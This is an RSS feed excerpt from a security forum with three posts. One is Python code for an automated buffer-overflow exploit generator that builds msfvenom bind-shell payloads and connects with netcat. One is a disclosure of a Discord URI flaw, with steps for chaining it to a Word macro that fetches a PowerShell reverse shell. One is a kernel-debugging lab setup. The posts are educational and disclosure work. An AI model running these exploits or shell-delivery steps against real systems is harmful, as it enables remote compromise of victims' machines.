 section_hex = "\x41" + "\x41" + "\x41" + allchars_unsure_hex[0]
 section_text = allchars_unsure_text[0] + "414141"
 section_text = section_text.replace("\\", "")
 section_text = section_text.replace("x", "")
 section_text = "0x" + section_text
 if(not argSilent):
  print section_text, "Section being searched for in memory"
 newBuffer = start + "BBBB" + section_hex + ("\x41" * (offset-8)) + "CCCC" + (shellSpace * "/x41") + end

 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 time.sleep(.6)
 bufFile = open("/usr/games/crossfire/bin/badchars.txt", "r")
 badData = bufFile.read()

 firstEggLocation = badData.find("0x42424242") + 11
 lastEggLocation = badData.find("0x41414141")
 badData = badData[firstEggLocation:lastEggLocation]

 if(not argSilent):
  print "-----stack------"
  print badData
  print "------------------"

 if(section_text in badData):
  allchars_unsure_hex = allchars_unsure_hex[1:]
  allchars_unsure_text = allchars_unsure_text[1:]
 else:
  if(not argSilent):
   print "BADCHAR VERIFIED:", allchars_unsure_text[0]
  badchars_hex.append(allchars_unsure_hex[0])
  badchars_text.append(allchars_unsure_text[0])
  allchars_unsure_hex = allchars_unsure_hex[1:]
  allchars_unsure_text = allchars_unsure_text[1:]
  continue

if(not argSilent):
 print "Badchar Detection Complete!"
 print "Bad Characters:", badchars_text
print "Acquiring JMP ESP..."
</code></pre>
<hr>
<p>This was one of the hardest parts of the program for me to make, as I had no idea whatsoever how to dump and access the relevant memory with gdb. I take a list of every possible ascii character value in hex, and send them in groups of 4 to the service to see if they display properly in memory. If they do, great! If not, one of those 4 characters is a ‘bad character’ and needs to be avoided when I generate my payload. So I add all 4 characters to an array of possible bad characters (since I don’t know which character is the bad one), whenever the expected character sequence fails to appear in memory.</p>
<p>I then do another pass at the service with the allchars_unsure array as my value library, sending each byte in a sequence paired with 3 A’s. Since my program operates under the assumption that A’s are valid characters, I know exactly what to look for. I found this to be a good compromise to approaching this problem, as one bad character can corrupt all of the output after it. I found groups of 4 bytes to be the most convenient to look for and parse with my debugger script, and that’s what I went with. This is probably also where my project falls the farthest from its goal of being an automated buffer overflow generator, since it’s possible a bad character could be invalid but display correctly in memory, and only corrupt the rest of the sequence. In this case, my program would fail to detect 1 out of every 4 such bad characters at a minimum.</p>
<hr>
<pre><code class="lang-python">bufFile = open("/usr/games/crossfire/bin/jmpSearch.txt", "r")
jmpData = bufFile.read()
jmpData = '\n'.join(jmpData.split('\n')[1:])

offset1 = jmpData[8:10].decode("hex")
offset2 = jmpData[6:8].decode("hex")
offset3 = jmpData[4:6].decode("hex")
offset4 = jmpData[2:4].decode("hex")
eipString = offset1 + offset2 + offset3 + offset4
badlist = ""
while (len(badchars_text) &gt; 0):
 badlist = badlist + badchars_text[0]
 badchars_text.pop(0)

badlist = "\\x" + badlist[0:2] + "\\x" + badlist[2:4] + "\\x" + badlist[4:6] + "\\x" + badlist[6:8]
argPayloadAttempts = int(argPayloadAttempts)
bashCommand = "msfvenom -p linux/x86/shell_bind_tcp LPORT=" + argShellPort + " -f raw -b \"" + badlist + "\" -e x86/shikata_ga_nai -o shellcode.txt"
#Payload JMP Offset Detection Phase
eaxLength = len(start)-2
jmpEAXCommand = "(echo \"add eax, "+ str(eaxLength) + "\") | exec /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb &gt; eaxHelp.txt 2&gt;/dev/null"
os.system(jmpEAXCommand)
bufFile = open("eaxHelp.txt")
eaxValue = bufFile.read()
eaxValue = eaxValue.replace("nasm","")
eaxValue = eaxValue.replace(" 00000000 ","")
eaxValue = eaxValue.replace("add eax,byte +0xc","")
eaxValue = eaxValue.replace(" ","")
eaxValue = eaxValue.replace("\n","")
eaxValue = eaxValue.replace("&gt;"," ")
eaxValue = eaxValue[9:]
eaxLength2 = len(eaxValue)
eaxValue = eaxValue[:eaxLength2-9]
eaxLength2 = len(eaxValue)
retString = ""
control = 0
while(eaxLength2 &gt; 0):
 retString = retString + "\\x" + eaxValue[control:control+2]
 eaxLength2 = eaxLength2-2
 control = control + 2
retString = retString.lower()
oldString = retString
retString = retString.decode("string_escape")
</code></pre>
<hr>
<p>My debugger script has helpfully created a file that contains a valid JMP ESP for us to hijack. So we use that, as well as the other information we’ve gathered so far, in order to create a bash command that will generate a payload. Additionally, since the service I was testing this code against only had 11 bytes of post-offset shellcode space, I decided to have the program assume there will never be enough space after the offset value to insert a payload, and to instead put the payload at the beginning of the buffer, and assume that there will be enough space after the offset to include a JMP instruction to redirect execution to that location. I use another one of Metasploit’s tools for this, albeit very messily.</p>
<hr>
<pre><code class="lang-python"> if(not argSilent):
  print "--- Building Payload ---"
 os.system(bashCommand)
 bufFile = open("shellcode.txt", "r")
 shellcode = bufFile.read()
 newBuffer = start + shellcode + ("\x41" * (offset-len(shellcode))) + eipString + retString + ("\xff\xe0\x90\x90") + end #the hardcoded values tell the program to jump to the prior variable value
 if(not argSilent):
  print "----------------------"
  print "Deploying Payload..."
 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 if(not argSilent):
  print("--- Initiating Bind Shell Connection ---")
 time.sleep(.6)
 output =  os.system("nc -v "+argLocalIP+" "+argShellPort)
 if(output == 0 or output == 2):
  argPayloadAttempts = 0
  payloadSuccess = True
 else:
  print "Connection Failure!"
  argPayloadAttempts = argPayloadAttempts - 1
if(not payloadSuccess):
 if(not argSilent):
  print "Payload Deployment Failed. Exiting program"
sys.exit()
</code></pre>
<hr>
<p>This is the (most) fun part! We try to build a payload, deploy it, and catch a shell. We try this a user specified number of times, using the same copy-pasted socket code as always.</p>
<hr>
<pre><code class="lang-python">###Build PayloadFile####
os.system("mv shellcode.txt " + argExploitName[0:3] +"Shellcode.txt")
shebang = "#!/usr/bin/python"
load = "import socket, os, time"
output = "output = 256"
outText = "print \"--- Spawning Shell ---\""
host = "host = \"" + str(argTargetIP) + "\""
port = "port = " + str(argTargetPort)
fileStart = "start = \"" + argStart.encode("string_escape") + "\""
fileEnd = "end = \"" + argEnd.encode("string_escape") + "\""
valOverwrite = "eipString = \"" + eipString.encode("string_escape") + "\""
jmpEax = "jmpEax = \"" + oldString + "\xff\xe0\x90\x90\"".encode("string_escape")
bufOne = "bufFile = open(\"" + argExploitName[0:3] + "Shellcode.txt" + "\", \"r\")"
bufTwo = "shellcode = bufFile.read()"
flow = "flow = \"A\" * " + str(offset-len(shellcode))
code = "buffer = (start + shellcode + flow + eipString + jmpEax + end)"
loopMe = "while(output == 256):"
networking1 = "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
networking2 = "s.connect((host, port))"
networking3 = "s.send(buffer)"
networking4 = "os.system(\"nc -v " + str(argTargetIP) + " " + str(argShellPort) + " 2&gt;/dev/null\")" #TODO change argShellPort to a more logical name, like argShellPort
ductTape = "time.sleep(.6)"
fullExploit = shebang + "\n" + load + "\n" + output + "\n" + host  + "\n" + port  + "\n" + fileStart + "\n" + flow + "\n" + fileEnd + "\n" + valOverwrite + "\n" + jmpEax + "\n" + bufOne + "\n" + bufTwo + "\n" + code  + "\n" + outText + "\n" + loopMe +  "\n " + networking1 + "\n " + networking2 + "\n " + networking3 + "\n " + ductTape + "\n " + networking4 + "\n "
savedExploit = open(argExploitName, "w")
savedExploit.write(fullExploit)
savedExploit.close()
if(not argSilent):
 print "----------------------"
 print "Exploit saved as " + argExploitName + ", please keep in the same directory as " +  (argExploitName[0:3] + "Shellcode.txt")
os.system("rm eaxHelp.txt")
os.system("rm offset.txt")
</code></pre>
<hr>
<p>We now save a very bad replica of this exploit we just made for later use. The buffer stays in a special file of its own because I couldn’t figure out how to properly write it to a single a file without encoding issues that cause the exploit to fail. Additionally, even though it should theoretically work on the first try (given we’re using the exact same buffer that worked before), it sometimes takes upwards of a minute’s worth of attempts to successfully exploit the service. I have no idea why. Maybe address space layout randomization, even though I thought I disabled that in my environment? Who knows! Also we delete a few temporary files we don’t need anymore and exit.</p>
<hr>
<pre><code class="lang-python">#!gdb
import sys
import gdb
import os
os.system("echo resetFile &gt; eip.txt")
number_restarts = 100
gdb.execute("set pagination off")
os.system("/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-bin_tools-0.1.4/bin/msfelfscan -j esp ./crossfire &gt; jmpSearch.txt")
def on_stop(sig):
  global number_restarts
  if isinstance(sig, gdb.SignalEvent):
    if (number_restarts &gt; 0):
      os.system("rm eip.txt")
      gdb.execute("set confirm off")
      gdb.execute("set logging file eip.txt")
      gdb.execute("set logging on")
      gdb.execute("set logging overwrite on")
      gdb.execute("info registers eip")
      gdb.execute("set logging off")
      gdb.execute("set logging file badchars.txt")
      gdb.execute("set logging on")
      gdb.execute("x/500xw $esp")
      gdb.execute("set logging overwrite off")
      gdb.execute("set logging off")
      gdb.execute("kill")
      gdb.execute("run")
gdb.events.stop.connect (on_stop)
gdb.execute("run")
</code></pre>
<hr>
<p>Lastly, we have my debugger script. On startup, it wipes anything from past exploit attempts and dumps a list of hijackable ESP’s for the main program to use. Additionally, whenever the program crashes for any reason whatsoever, it dumps the EIP registry and 500 lines of stack memory for usage by my main program.</p>
<hr>
<p>That’s pretty much it. You’re welcome to adapt or use this code for your own purposes, if you think it has any value. I’m reasonably confident I could emulate the restart script with mona and have it work with immunity debugger, and thus be cross platform. In such a case, this tool may be functional (with some work) on the OSCP exam. I’m not sure whether or not it would be allowed though, since then you wouldn’t actually have to know what you’re doing in order to pass that portion of the test. That being said, given my poor programming ability (and the scarcity of these exploits in the wild), it would also be reasonable to assume there isn’t much value to my project outside of it being a wonderful learning experience for me. If anyone has any questions, I will add them to my Q&amp;A, and please feel free to ask whatever comes to mind.</p>
<p>Here’s a screenshot of my program in action: <a href="https://i.imgur.com/POnukSS.png" rel="nofollow noopener">https://i.imgur.com/POnukSS.png</a></p>
<p>Q&amp;A</p>
<hr>
<p>Q: Why did you write this in Python 2.7?</p>
<p>A: I didn’t actually know I wasn’t using the latest version of python until I had already committed to writing it in 2.7, which was the default version of python on my Linux distro. If Backbox/Kali used 3.0 by default this would have been written in that.</p>
<p>Q: What are those ugly sleep statements for? Why do your scripts communicate by reading and writing to local files?</p>
<p>A: I’m kind of self conscious about this because I’m pretty sure it’s a garbage way to solve this problem, but when I was trying to figure out how to have my scripts interact with each other at all this was the first thing I thought of and it’s what I did.</p>
<hr>
            <p><small>19 posts - 7 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415</link>
          <pubDate>Fri, 03 May 2019 23:29:28 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-13415</guid>
          <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
        </item>
        <item>
          <title>Using URI to pop shells via the Discord Client</title>
          <dc:creator><![CDATA[RagSec]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/00d493679a22eaab33a03bd4ac8e66b24a6ddfdb.png" alt="" width="" height=""></p>
<p><strong>Introduction</strong></p>
<p>Myself and a fellow researcher: Styx were the leads on this research and we were backed up by <a href="https://www.twitter.com/cybersecstu" rel="noopener nofollow ugc">CyberSecStu</a>, and <a href="https://www.twitter.com/5w0rdFish" rel="noopener nofollow ugc">5w0rdFish</a> from <a href="https://themanyhats.club" rel="noopener nofollow ugc">The Many Hats Club</a>. We discovered a vulnerability within the Discord client that enabled an attacker to call local programs on a target system. We then took this flaw and used it to pivot through MS-Word macros to start a reverse TCP shell automatically from the discord client.</p>
<p><strong>Understanding</strong></p>
<p>What is Uniform Resource Identifier (URI)?<br>
A Uniform Resource Identifier (URI) is a string of characters that unambiguously identifies a particular resource. To guarantee uniformity, all URIs follow a predefined set of syntax rules, but also maintain extensibility through a separately defined hierarchical naming scheme (e.g. “http://”).</p>
<p>We were informed by a third party that the discord client will accept URI schemes as links if you put it in &lt;&gt;</p>
<p>For more information check out Shay’s work on different methods of URI abuse in Discord <a href="https://drive.google.com/file/d/1SCTj4WZo8VlitrAazPCueGz3Gg60jG5d/view" rel="noopener nofollow ugc">here</a></p>
<p>So when Discord is passed a URI like below</p>
<p><em>&lt;[URI Scheme]://[Random Input]&gt;</em></p>
<p>It would enable us to call local applications. For example:</p>
<p><em><a>calculator://a</a></em></p>
<p>This would be interpreted by Discord as a link and when clicked would cause the calculator application to execute and open on the local machine.</p>
<p>Styx and I then began researching into URIs and the types of requests we could make. This leads us to the <a href="https://www.iana.org/assignments/uri-schemes/uri-schemes.xhtml" rel="noopener nofollow ugc">IANA URI Schemes</a>. From there we began enumerating which of the URI’s we could execute and which fail.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8beb5978b8abf632343cfadaf96fdd9df6dada3a.png" alt="" width="" height=""></p>
<p>An example of the URI testing</p>
<p>If the URI was requesting something that wasn’t installed on the host system it would display the below message. For example:</p>
<p><em><a>afp://a</a></em></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7d0fcf866039e77153a9cc824da4e960a0701dc4.png" alt="" width="" height=""></p>
<p>Failed to call AFP</p>
<p>We soon discovered that you could make all sorts of local programs open. Some of the most interesting being: all of the ms-office applications <em><a>ms-word://a</a></em>, basic windows applications eg. Calculator <em><a>calculator://a</a></em> or Mail <em><a>mailto://a</a></em> , browsers using FTP <em><a>FTP://127.0.0.1</a></em> or Chrome using <em><a>chrome://a</a></em> among many others.</p>
<p>Something we found that was interesting was the ability to open windows media player and have it stream audio from the internet using where it would again just automatically open and connect without prompting the victim.</p>
<p>While enumerating the inputs for the URI links we discovered that it accepted UTF-8 encoded text so knowing this we could specific arguments and URLs after the service indicator.</p>
<p><strong>Exploitation</strong></p>
<p>As discussed above we are able to call Microsoft Office programs. So we began looking further into this and it gives us the ability to automatically open remote files using <em>&lt;ms-word://[file location]&gt;</em>. So this means we can run potentially infected files with VBA macros.<br>
So we took this idea and attempted to test it.</p>
<p>Step 1, Use <a href="https://www.trustedsec.com/social-engineer-toolkit-set/" rel="noopener nofollow ugc">SET</a> to generate a Powershell Reverse Shell</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/07b8e32becf62e193be502c3245137042b78aae1.png" alt="" width="" height=""></p>
<p>Use Option 1 – Social-Engineering Attacks</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/af4d0634b14ba2799b2861bbce34fc3176709dbb.png" alt="" width="" height=""></p>
<p>Use Option 9 – Powershell Attack Vector</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/03ca56d042c0fb5184e4163bfaa6afd53d6de0f7.png" alt="" width="" height=""></p>
<p>Use Option 2 – Powershell Reverse Shell</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e4b1292f3f8493509c2cfc4037438975a84707fd.png" alt="" width="" height=""></p>
<p>Type in your IP Address</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/ebf7e5c23afa2c5f27e5babc1d915056784b872a.png" alt="" width="" height=""></p>
<p>Specify a port for the shell to use</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e52fb391bf9a7a0a4d8aa68a1b922dbf9c609cfa.png" alt="" width="" height=""></p>
<p>You can choose to start a lister or not</p>
<p>Step 2, Upload the generated payload<br>
Using whatever service you want put the payload file on the internet so the macro which you can create later.</p>
<p>Step 3, Create the VBA Macro in the word document (.docm, .dotm)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b975282c6ed2e9b31dcd7f63a6e17823079e4b60.png" alt="" width="" height=""></p>
<p>Here is an example of the macro</p>
<p>Step 4, Upload the word file<br>
Save the file and upload it to the same place as a the payload so it can also be called remotely<br>
Step 5,  Start listener if you haven’t already</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/adc05f2abe1d7cddfc7052658ae7e7f74dd5f66d.png" alt="" width="" height=""></p>
<p>Using netcat create a lister on port 4444 or whatever port you specified in SET</p>
<p>Step 6, Send victim URI<br>
<em>&lt;ms-word:nft%7Cu%7C[LOCATION OF WORD FILE]%7Cs%7Chttp://[LOCATION OF WORD FILE]&gt;</em></p>
<p><em>&lt;ms-word:nft|u|[LOCATION OF WORD FILE]|s|[LOCATION OF WORD FILE]&gt;</em></p>
<p>For more information regarding the ms-word URI goto <a href="https://docs.microsoft.com/en-us/office/client-developer/office-uri-schemes" rel="noopener nofollow ugc">this link</a></p>
<p>Step 7, GG Shell Popped! 1337 af</p>
<p><strong>Disclosure</strong></p>
<p>Once we had a functional PoC it was time to contact discord. We did so via Twitter and their Bug Bounty Disclosure page on their website. Following Correspondance, with Discord’s security team they discussed that the URI filtering issue wasn’t in the scope of their bug bounty scheme as it apparently classed under “Social Engineering”. However, they have pushed forward to dealing with the issue and elevating the patching action internally.</p>
<p><em>“However, given, this is the intended behaviour of how custom protocols work on computers in general, we don’t consider this a security vulnerability – and at best a social engineering attack, which is, unfortunately not covered by our bug-bounty” – Discord’s Security Team</em></p>
<p><strong>Conclusion</strong></p>
<p>In conclusion, the URI validation in the Discord Client is insufficient it should not be able to call local programs nor does it require that functionality. It just leaves discord users vulnerable to attack. All it would take is one really well-crafted piece of malware to be executed by one of the many accepted URIs and a victims machine can be directly affected. While the reverse shell or other functionality does not come directly from the discord client the client enables the attacker the ability to pivot through itself and affect the victims’ machine directly. Discord can likely solve this issue by implementing some degree of input validation when it comes to URI scheme, eg. filter all but HTTP and https as these are the only ones that make practical sense to a typical user to have access to.</p>
            <p><small>14 posts - 6 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/using-uri-to-pop-shells-via-the-discord-client/11673">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/using-uri-to-pop-shells-via-the-discord-client/11673</link>
          <pubDate>Mon, 18 Feb 2019 16:27:47 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-11673</guid>
          <source url="https://d.clarkee.co.uk/t/using-uri-to-pop-shells-via-the-discord-client/11673.rss">Using URI to pop shells via the Discord Client</source>
        </item>
        <item>
          <title>Point of no C3 | Linux Kernel Exploitation - Part 0</title>
          <dc:creator><![CDATA[exploit]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>In the name of Allah, the most beneficent, the most merciful.</p>
<hr>
<p><strong>HAH</strong>IRRITATED<strong>AHAHAHAHAHAHAHA</strong><br>
<em>“Appreciate the art, master the craft.”</em><br>
<strong>AHAHAHAH</strong>OUTDATED<strong>AHAHAHAHAH</strong></p>
<p>It’s been more than a year, huh? but I’m back, with <em>“Point of no C3”</em>. It’s main focus will be <em>Kernel Exploitation</em>, but that won’t stop it from looking at other things.</p>
<p>Summary</p>
<ul>
<li>Chapter I: Environment setup:
<ul>
<li>Preparing the VM</li>
<li>Using KGDB to debug the kernel</li>
<li>Compiling a simple module</li>
<li>What?</li>
<li>Few structs</li>
<li>Debug a module</li>
</ul>
</li>
<li>Chapter II: Overview on security and General understanding:
<ul>
<li>Control Registers</li>
<li>SMAP</li>
<li>SMEP</li>
<li>Write-Protect</li>
<li>Paging(a bit of segmentation too)</li>
<li>Processes</li>
<li>Syscalls</li>
<li>IDT(Interrupt Descriptor Table)</li>
<li>KSPP</li>
<li>KASLR</li>
<li>kptr_restrict</li>
<li>mmap_min_addr</li>
<li>addr_limit</li>
</ul>
</li>
</ul>
<h4>Chapter I: <em>Environment setup</em>
</h4>
<p>“<em>No QEMU for you.</em>”</p>
<h5>Preparing the VM:</h5>
<p>To begin with, we would set up the environment and the VM’s in order to experiment on them.<br>
For this, <a href="https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/" rel="noopener nofollow ugc"><em>Debian</em></a> was choosen(<em>core only</em>).<br>
Other choices include <em>SUSE</em> or <em>Centos</em>, etc.</p>
<pre><code class="lang-perl">debian-9.4.0-amd64-netinst.iso			2018-03-10 12:56 291M [X]
debian-9.4.0-amd64-xfce-CD-1.iso		2018-03-10 12:57 646M
debian-mac-9.4.0-amd64-netinst.iso		2018-03-10 12:56 294M
</code></pre>
<p>A VM is then created with atleast <strong>35GB</strong> space.(<em>Hey, It’s for compiling the kernel!</em>)</p>
<pre><code class="lang-perl">Installer disc image file (iso):
[C:\vm\debian-9.4.0-amd64-netinst.iso	[▼]]
⚠ Could not detect which operating system is in this disc image.
  You will need to specify which operating system will be installed.
</code></pre>
<p>Once you boot it, you can proceed with <em>Graphical Install</em>, and since we only want the core, stop at <em>Software selection</em> and have only <strong>SSH server</strong> and <strong>standard system utilities</strong> selected.<br>
And when it’s done, you’ll have your first VM ready.</p>
<pre><code class="lang-bash">
Debian GNU/Linux 9 Nwwz tty1
Hint: Num Lock on

Nwwz login: root
Password:
Linux Nwwz 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@Nwwz:~#
</code></pre>
<p>In order to get the latest stable Linux kernel release(<em>4.17.2 at the time of writing</em>) and run it.<br>
We would start by installing necessary packages:</p>
<pre><code class="lang-bash">apt-get install git build-essential fakeroot ncurses* libssl-dev libelf-dev ccache gcc-multilib bison flex bc
</code></pre>
<p>Downloading the kernel tarball and the patch:</p>
<pre><code class="lang-bash">root@Nwwz:~# cd /usr/src
root@Nwwz:/usr/src# wget "https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.17.2.tar.gz"
root@Nwwz:/usr/src# wget "https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/patch-4.17.2.gz"
</code></pre>
<p>Extracting them:</p>
<pre><code class="lang-bash">root@Nwwz:/usr/src# ls
linux-4.17.2.tar.gz patch-4.17.2.gz
root@Nwwz:/usr/src# gunzip patch-4.17.2.gz
root@Nwwz:/usr/src# gunzip linux-4.17.2.tar.gz
root@Nwwz:/usr/src# tar -xvf linux-4.17.2.tar
</code></pre>
<p>Moving and applying the patch:</p>
<pre><code class="lang-bash">root@Nwwz:/usr/src# ls
linux-4.17.2 linux-4.17.2.tar patch-4.17.2
root@Nwwz:/usr/src# mv patch-4.17.2 linux-4.17.2/
root@Nwwz:/usr/src# cd linux-4*2
root@Nwwz:/usr/src/linux-4.17.2# patch -p1 &lt; patch-4.17.2
</code></pre>
<p>Cleaning the directory and copying the original bootfile to the current working directory and changing the config with an <em>ncurses</em> menu:</p>
<pre><code class="lang-bash">root@Nwwz:/usr/src/linux-4.17.2# make mrproper
root@Nwwz:/usr/src/linux-4.17.2# make clean
root@Nwwz:/usr/src/linux-4.17.2# cp /boot/config-$(uname -r) .config
root@Nwwz:/usr/src/linux-4.17.2# make menuconfig
</code></pre>
<p>One must then set up the following fields:</p>
<pre><code class="lang-auto">[*] Networking support 	---&gt;
    Device Drivers		---&gt;
	Firmware Drivers	---&gt;
	File systems		---&gt;
[X] Kernel hacking		---&gt;
		printk and dmesg options					---&gt;
	[X] Compile-time checks and compiler options	---&gt;
		...
		[*] Compile the kernel with debug info
		...
	...
	-*- Kernel debugging
	...
	[*] KGDB: kernel debugger
</code></pre>
<pre><code class="lang-auto">	Do you wish to save your new configuration?
	Press &lt;ESC&gt;&lt;ESC&gt; to continue kernel configuration.
			[&lt; Yes &gt;]			&lt; No &gt;
</code></pre>
<p>Make sure you do have similiar lines on .config:</p>
<pre><code class="lang-bash">CONFIG_STRICT_KERNEL_RWX=n
CONFIG_DEBUG_INFO=y
CONFIG_HAVE_HARDENED_USERCOPY_ALLOCATOR=n
CONFIG_HARDENED_USERCOPY=n
CONFIG_HARDENED_USERCOPY_FALLBACK=n
</code></pre>
<p>Before starting the compiling process, to faster the process, you can split the work to multiple jobs(<em>on different processors</em>). <strong>nproc</strong> would hand you the number of processing units available.</p>
<pre><code class="lang-bash">root@Nwwz:/usr/src/linux-4.17.2# nproc
4
root@Nwwz:/usr/src/linux-4.17.2# make -j4
</code></pre>
<p>It will then automatically go through <em>stage 1 &amp; 2</em>:</p>
<pre><code class="lang-bash">Setup is 17116 bytes (padded to 17408 bytes).
System is 4897 kB
CRC 2f571cf0
Kernel: arch/x86/boot/bzImage is ready	(#1)
	Building modules, stage 2.
	MODPOST	3330 modules
(SNIP)
	CC		virt/lib/irqbypass.mod.o
	LD [M]	virt/lib/irqbypass.ko
root@Nwwz:/usr/src/linux-4.17.2#
</code></pre>
<p>If somehow, there’s no <em>stage two</em>, a single command should be executed before moving on:<br>
(This normally isn’t required.)</p>
<pre><code class="lang-auto">make modules
</code></pre>
<p>Installing the modules:</p>
<pre><code class="lang-bash">root@Nwwz:/usr/src/linux-4.17.2# make modules_install
(SNIP)
	INSTALL	sound/usb/usx2y/snd-usb-usx2y.ko
	INSTALL	virt/lib/irqbypass.ko
	DEPMOD	4.17.0
root@Nwwz:/usr/src/linux-4.17.2#
</code></pre>
<p>Installing and preparing the kernel for boot:</p>
<pre><code class="lang-bash">root@Nwwz:/usr/src/linux-4.17.2# make install
(SNIP)
Found linux image: /boot/vmlinuz-4.17.0
Found initrd image: /boot/initrd.img-4.17.0
Found linux image: /boot/vmlinuz-4.9.0-6-amd64
Found initrd image: /boot/initrd.img-4.9.0-6-amd64
done
root@Nwwz:/usr/src/linux-4.17.2# cd /boot
root@Nwwz:/boot# mkinitramfs -o /boot/initrd.img-4.17.0 4.17.0
root@Nwwz:/boot# reboot
</code></pre>
<p>You can then choose the new kernel from the boot screen:</p>
<pre><code class="lang-auto">*Debian GNU/Linux, with Linux 4.17.0
 Debian GNU/Linux, with Linux 4.17.0 (recovery mode)
 Debian GNU/Linux, with Linux 4.9.0-6-amd64
 Debian GNU/Linux, with Linux 4.9.0-6-amd64 (recovery mode)
</code></pre>
<p>If it fails however, saying that it’s an out-of-memory problem, you can reduce the size of the boot image.</p>
<pre><code class="lang-bash">root@Nwwz:/boot# cd /lib/modules/4.17.0/
root@Nwwz:/lib/modules/4.17.0# find . -name *.ko -exec strip --strip-unneeded {} +
root@Nwwz:/lib/modules/4.17.0# cd /boot
root@Nwwz:/boot# mkinitramfs -o initrd.img-4.17.0 4.17.0
</code></pre>
<p>It’ll then boot successfully.</p>
<pre><code class="lang-auto">root@Nwwz:~# uname -r
4.17.0
</code></pre>
<h5>Using KGDB to debug the kernel:</h5>
<p>Installing <strong>ifconfig</strong> and running it would be the first thing to do:</p>
<pre><code class="lang-bash">root@Nwwz:~# apt-get install net-tools
(SNIP)
root@Nwwz:~# ifconfig
ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.150.145  netmask 255.255.255.0  broadcast 192.168.150.255
(SNIP)
</code></pre>
<p>Back to <em>Debian</em> machine, transfering <strong>vmlinux</strong> to the host is done with SCP or WinSCP in my case.</p>
<pre><code class="lang-auto">root@Nwwz:~# service ssh start
</code></pre>
<pre><code class="lang-auto">..							Répertoire parent
vmlinux			461 761 KB	Fichier
</code></pre>
<p>With this, you’ll have debug symbols ready, but you still need to enable KGDB for the target kernel.</p>
<pre><code class="lang-bash">root@Nwwz:~# cd /boot/grub
root@Nwwz:/boot/grub# nano grub.cfg
</code></pre>
<p>Editing a single line, adding <em>__setup</em> arguments, we would then be able to manipulate the kernel for our needs, such as <em>disabling KASLR</em> and <em>enabling KGDB</em>.<br>
Search for the first ‘<em>Debian GNU</em>’ occurence and make sure it’s the wanted kernel, and add the following to the line starting with [X]: <em>kgdboc=ttyS1,115200 kgdbwait nokaslr</em>.</p>
<pre><code class="lang-auto">menuentry 'Debian GNU/Linux' --class debian --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-simple-b1a66d11-d729-4f23-99b0-4ddfea0af6c5' {
	...
	echo	'Loading Linux 4.17.0 ...'
	[X] linux	/boot/vmlinuz-4.17.0 root=UUID=b1a66d11-d729-4f23-99b0-4ddfea0af6c5 ro quiet kgdboc=ttyS1,115200 kgdbwait nokaslr
	echo	'Loading initial ramdisk ...'
	initrd	/boot/initrd.img-4.17.0
}
</code></pre>
<p>In order to debug the running kernel, another VM similer to the one made previously(<em>Debian</em>) will be created(<em>Debian HOST</em>).<br>
Now shutdown both VMs in order to set the pipe:</p>
<ul>
<li>
<em>Debian</em>:<pre><code class="lang-auto">⦿ Use named pipe:
	*---------------------------------------*
	| \\.\pipe\com_2                        |
	*---------------------------------------*
	[This end is the server.             [▼]]
	[The other end is a virtual machine. [▼]]
---------------------------------------------7
I/O mode
⧆ Yield CPU on poll

	Allow the guest operating system to use this serial
	port in polled mode (as opposed to interrupt mode).
</code></pre>
</li>
<li>
<em>DebianHOST</em>:<pre><code class="lang-auto">⦿ Use named pipe:
	*---------------------------------------*
	| \\.\pipe\com_2                        |
	*---------------------------------------*
	[This end is the client.             [▼]]
	[The other end is a virtual machine. [▼]]
---------------------------------------------7
I/O mode
⧆ Yield CPU on poll

	Allow the guest operating system to use this serial
	port in polled mode (as opposed to interrupt mode).
</code></pre>
</li>
</ul>
<p>Getting the <strong>vmlinux</strong> image to <em>DebianHOST</em> after installing necessary packages:</p>
<pre><code class="lang-bash">root@Nwwz:~# apt-get install gcc gdb git net-tools
root@Nwwz:~# cd /home/user
root@Nwwz:/home/user# ls
vmlinux
root@Nwwz:/home/user# gdb vmlinux
